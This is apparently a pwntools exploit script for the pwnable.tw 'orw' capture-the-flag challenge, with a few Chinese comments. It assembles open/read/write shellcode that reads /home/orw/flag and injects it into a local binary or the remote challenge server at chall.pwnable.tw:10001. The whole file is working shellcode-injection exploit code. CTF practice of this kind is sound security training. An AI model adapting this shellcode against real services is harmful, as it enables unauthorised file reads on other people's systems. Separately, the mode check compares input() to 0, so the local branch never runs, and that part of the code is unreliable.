#coding:utf-8
from pwn import *

sc = shellcraft.pushstr("/home/orw/flag")
# 下面几个函数调用都是通过int 80h调用的，其中三个参数分别为ebx,ecx,edx
sc += shellcraft.open("esp",0,0)
sc += shellcraft.read(3,"esp",100)
sc += shellcraft.write(1,"esp",100)
sc = asm(sc)

def pwn():
	para = input("native processing or remote connection, 1 for latter,0 for former: ")
	if (para == 0):
		native_process()
	else:
		remote_connection()

def remote_connection():
	p=remote('chall.pwnable.tw',10001)#远程
	p.recv()
	p.sendline(sc)

	p.interactive()


def native_process():
	p = process('./orw')
	p.recv()

	p.sendline(sc)

	p.interactive()
pwn()
